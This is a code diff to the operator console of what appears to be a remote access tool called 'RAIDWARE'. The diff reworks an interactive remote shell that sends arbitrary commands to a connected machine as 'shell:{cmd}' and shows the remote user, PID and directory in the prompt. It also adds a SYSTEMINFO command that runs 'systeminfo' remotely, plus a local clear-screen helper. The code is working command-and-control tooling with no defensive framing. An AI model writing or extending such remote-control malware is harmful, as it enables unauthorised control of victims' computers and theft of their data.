@@ -1,5 +1,10 @@
 from CLI.utils.colors import log_error
 
+
+def CLEAR(*args):
+    from os import system, name
+    system("cls" if name == "nt" else "clear")
+    
 class Handle:
     conn = None
     is_running = True
@@ -12,16 +17,18 @@ def SHELL(*args):
         log_error("No connection has been established")
         return
 
-    Handle.conn.send("RAIDWARE-INTERACT")
-    buffer = Handle.conn.recv()
+    _isExit = False
+    # Handle.conn.send("RAIDWARE-INTERACT")
+    # buffer = Handle.conn.recv()
 
-    ''' Printing the prompt based on OS: '''
-    buffer = buffer.split('|')
+    # ''' Printing the prompt based on OS: '''
+    # buffer = buffer.split('|')
+    buffer = Handle.conn.pwd
     def update():
         if 'Windows' in Handle.conn.OS:
-            return f"{buffer[2]}> "
+            return f"[{Handle.conn.pid}] {buffer}> "
         else:
-            return f"{buffer[0]}@{buffer[1]}:{buffer[2]}$ "
+            return f"{Handle.conn.user}:{buffer}$ "
 
     prompt = update()
 
@@ -31,6 +38,7 @@ def SHELL(*args):
             if cmd == "":
                 continue
             if cmd.lower() == "quit"  or cmd.lower() == "exit":
+                Handle._isExit = True
                 Handle.conn.send("RAIDWARE-INTERACT-END")
                 rcv = Handle.conn.recv()
                 if rcv == "END-ACK":
@@ -38,6 +46,10 @@ def SHELL(*args):
                 else:
                     log_error("Unable to close the connection. Forcefully breaking out...")
                     break
+
+            if cmd.lower() == "clear" or cmd.lower() == "cls":
+                CLEAR()
+                continue
 
             curr = cmd.split()
 
@@ -49,11 +61,11 @@ def SHELL(*args):
                 print("UNIMPLEMENTED")
                 continue
 
-            Handle.conn.send(f"RAIDWARE-CMD {cmd}")
+            Handle.conn.send(f"shell:{cmd}")
             rcv = Handle.conn.recv()
             if curr[0].lower() == "cd":
                 if "Error" not in rcv:
-                    buffer[2] = rcv
+                    buffer = rcv
                     prompt = update()
                     continue
                 else:
@@ -62,12 +74,16 @@ def SHELL(*args):
             print(rcv)
         except KeyboardInterrupt:
             print()
+            if Handle._isExit:
+                break
             if curr[0].lower() == "quit" or curr[0].lower() == "exit":
                 break
             log_error("Please type \"[RED]EXIT[RESET]\" or \"[RED]QUIT[RESET]\" to break out of the shell.")
             continue
         except EOFError:
             print()
+            if Handle._isExit:
+                break
             if curr[0].lower() == "quit" or curr[0].lower() == "exit":
                 break
             
@@ -89,4 +105,9 @@ def KILL(*args):
     pass
 
 def SYSTEMINFO(*args):
-    pass
+    if Handle.conn == None:
+        log_error("No connection has been established")
+        return
+    Handle.conn.send(f"shell:systeminfo")
+    rcv = Handle.conn.recv()
+    print(rcv)
